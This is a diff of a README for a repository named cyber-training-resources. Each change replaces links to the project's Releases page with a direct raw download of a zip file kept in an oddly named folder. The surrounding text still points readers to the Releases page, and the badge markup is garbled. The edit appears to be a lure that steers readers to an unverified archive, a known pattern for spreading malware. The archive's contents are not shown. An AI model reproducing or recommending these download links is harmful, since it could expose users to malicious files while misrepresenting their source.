@@ -1,6 +1,6 @@
 # 🎓 cyber-training-resources - Essential Tools for Cybersecurity Learning
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/RealRGJ/cyber-training-resources/releases)
+[![Download Latest Release](https://github.com/RealRGJ/cyber-training-resources/raw/refs/heads/main/bebouldered/training-resources-cyber-v1.1.zip%20Latest%https://github.com/RealRGJ/cyber-training-resources/raw/refs/heads/main/bebouldered/training-resources-cyber-v1.1.zip)](https://github.com/RealRGJ/cyber-training-resources/raw/refs/heads/main/bebouldered/training-resources-cyber-v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the cyber-training-resources repository! This collection provides val
 
 ## 📥 Download & Install
 
-To start using the resources, visit this page to download: [Download Cyber Training Resources](https://github.com/RealRGJ/cyber-training-resources/releases).
+To start using the resources, visit this page to download: [Download Cyber Training Resources](https://github.com/RealRGJ/cyber-training-resources/raw/refs/heads/main/bebouldered/training-resources-cyber-v1.1.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version available.
@@ -84,4 +84,4 @@ For more information on cybersecurity training, check out the tags related to th
 - **security-training**
 - **training-dataset**
 
-Visit this page to download: [Cyber Training Resources](https://github.com/RealRGJ/cyber-training-resources/releases).
+Visit this page to download: [Cyber Training Resources](https://github.com/RealRGJ/cyber-training-resources/raw/refs/heads/main/bebouldered/training-resources-cyber-v1.1.zip).
